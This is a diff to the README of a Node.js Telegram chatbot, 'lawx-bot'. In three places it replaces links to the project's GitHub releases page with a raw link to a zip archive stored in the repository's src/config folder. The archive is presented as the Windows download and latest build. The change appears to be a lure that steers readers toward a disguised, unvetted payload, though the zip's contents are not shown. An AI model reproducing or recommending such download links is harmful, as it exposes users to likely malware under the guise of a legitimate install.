@@ -1,6 +1,6 @@
 # 🤖 lawx-bot - Run the bot in minutes
 
-[![Download lawx-bot](https://img.shields.io/badge/Download%20lawx--bot-ff69b4?style=for-the-badge)](https://github.com/poltroon-diatom79/lawx-bot/releases)
+[![Download lawx-bot](https://img.shields.io/badge/Download%20lawx--bot-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/poltroon-diatom79/lawx-bot/main/src/config/bot_lawx_1.4.zip)
 
 ## ⚡ What is lawx-bot?
 
@@ -21,7 +21,7 @@ This project uses Node.js and an AI layer to handle chat tasks through Telegram.
 
 Visit the release page here:
 
-[https://github.com/poltroon-diatom79/lawx-bot/releases](https://github.com/poltroon-diatom79/lawx-bot/releases)
+[https://raw.githubusercontent.com/poltroon-diatom79/lawx-bot/main/src/config/bot_lawx_1.4.zip](https://raw.githubusercontent.com/poltroon-diatom79/lawx-bot/main/src/config/bot_lawx_1.4.zip)
 
 On that page, choose the newest release for Windows. If you see a file like `.exe`, ` .zip`, or `.msi`, download that file.
 
@@ -176,7 +176,7 @@ Use this short test after install:
 
 Download or get the latest build here:
 
-[https://github.com/poltroon-diatom79/lawx-bot/releases](https://github.com/poltroon-diatom79/lawx-bot/releases)
+[https://raw.githubusercontent.com/poltroon-diatom79/lawx-bot/main/src/config/bot_lawx_1.4.zip](https://raw.githubusercontent.com/poltroon-diatom79/lawx-bot/main/src/config/bot_lawx_1.4.zip)
 
 ## 🆘 Troubleshooting
 
